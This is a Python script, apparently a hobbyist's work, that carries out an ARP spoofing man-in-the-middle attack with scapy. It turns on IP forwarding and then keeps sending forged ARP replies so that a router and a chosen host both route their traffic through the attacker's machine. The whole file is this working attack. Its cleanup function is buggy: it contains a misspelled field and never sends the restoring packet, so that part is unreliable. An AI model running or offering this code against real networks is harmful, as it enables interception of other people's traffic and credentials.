#!/usr/bin/env python

import scapy.all as scapy
import time
import subprocess
import sys

# x=input('Please enter the target IP addressof the target :  ')
# y=input('Please enter the IP address of the target router')
subprocess.call('echo 1 > /proc/sys/net/ipv4/ip_forward', shell=True)


# not_used subprocess.call('clear', shell=True)

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    return (answered_list[0][1].hwsrc)


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    source_mac = get_mac(source_ip)
    destination_mac = get_mac(destination_ip)
    # was changed to get_mac(originally 'getmac'), there might be a problem there even though it tends to work, only as a test
    packet = scapy.ARP(op=2, pdst=destination_ip, hdwst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    print(packet.show())
    print(packet.summary())


# not_used restore()
try:
    sent_packets_count = 0
    print('[+] Starting programme')
    try:
        while True:
            spoof('192.168.1.1', '192.168.1.126')
            spoof('192.168.1.126', '192.168.1.1')
            sent_packets_count = sent_packets_count + 2
            print('\r[+] Packets sent:  ' + str(sent_packets_count)),
            sys.stdout.flush()
            time.sleep(1)
    except IndexError:
        # print('\r[-]One of the target devices has disconnected from the internet or has stopped using it, programme will be made in the future where we are constantly scanning for the device')
        try:
            print('\r[+] Failed to find target')
            time.sleep(1)
            print('[+] Starting search programme')
            while True:
                subprocess.call('python constant_arp_scanner_source.py', shell=True)
                time.sleep(1)
        except KeyboardInterrupt:
            print('\r[+] Closing programme')

except ImportError:
# work in progress
    print('[-]  Module failed to load\nwould you like to check each module? ')

